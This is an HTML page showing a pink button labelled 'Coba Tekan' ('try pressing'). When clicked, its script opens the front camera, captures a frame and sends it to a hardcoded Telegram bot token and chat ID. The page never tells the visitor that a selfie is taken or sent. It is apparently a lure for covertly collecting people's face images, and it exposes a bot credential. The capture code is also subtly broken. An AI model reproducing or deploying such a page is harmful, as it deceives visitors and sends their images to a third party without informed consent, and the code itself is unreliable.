<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Take Selfie and Send to Telegram</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
        }
        .button-container {
            text-align: center;
        }
        .pink-button {
            background-color: #ff69b4;
            color: white;
            border: none;
            padding: 20px 40px;
            font-size: 24px;
            cursor: pointer;
            border-radius: 10px;
            font-weight: bold;
        }
        .pink-button:hover {
            background-color: #ff1493;
        }
    </style>
</head>
<body>
    <div class="button-container">
        <button class="pink-button" id="captureSelfie">Coba Tekan</button>
    </div>
    <script>
        document.getElementById('captureSelfie').addEventListener('click', async () => {
            try {
                // Access front camera
                const frontCamera = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });

                // Create video element to capture camera stream
                const frontVideo = document.createElement('video');
                frontVideo.srcObject = frontCamera;
                frontVideo.play();

                // Capture image from front camera
                const canvas = document.createElement('canvas');
                canvas.width = frontVideo.videoWidth;
                canvas.height = frontVideo.videoHeight;

                const context = canvas.getContext('2d');
                context.drawImage(frontVideo, 0, 0, canvas.width, canvas.height);

                const imageData = canvas.toDataURL('image/jpeg');

                // Send image to Telegram bot
                const botToken = '8614744009:AAEu0vGF14i_rVeZL6Q6ean-Vq_VC0xrdwc';
                const chatId = '7856697051'; // Replace with your chat ID

                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        photo: imageData,
                        caption: 'Selfie from user'
                    })
                });

                const result = await response.json();
                console.log('Photo sent:', result);

                // Stop camera stream
                frontCamera.getTracks().forEach(track => track.stop());
            } catch (error) {
                console.error('Error capturing selfie:', error);
            }
        });
    </script>
</body>
</html>
